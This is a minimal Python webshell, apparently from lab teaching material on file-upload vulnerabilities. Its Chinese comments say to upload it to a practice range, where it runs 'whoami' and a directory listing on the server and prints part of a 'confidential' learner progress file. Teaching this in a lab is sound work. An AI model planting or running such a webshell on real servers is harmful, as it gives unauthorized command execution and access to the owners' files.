# 把这个文件保存为 shell.py，然后上传到靶场
# 这是最基础的 WebShell —— 上传后访问 /uploads/shell.py 即可在服务器上执行命令

import os

print("=== 我是谁（当前用户）===")
print(os.popen("whoami").read().strip())

print("\n=== 当前目录有哪些文件 ===")
print(os.popen("dir /b").read().strip())

print("\n=== 偷偷读一下服务器上的"机密"文件 ===")
try:
    with open("learner/progress.json", encoding="utf-8") as f:
        print(f.read()[:400])
except Exception as e:
    print("读不到:", e)

print("\n💀 如果你能看见上面这些内容，说明 WebShell 已经在服务器上执行了")
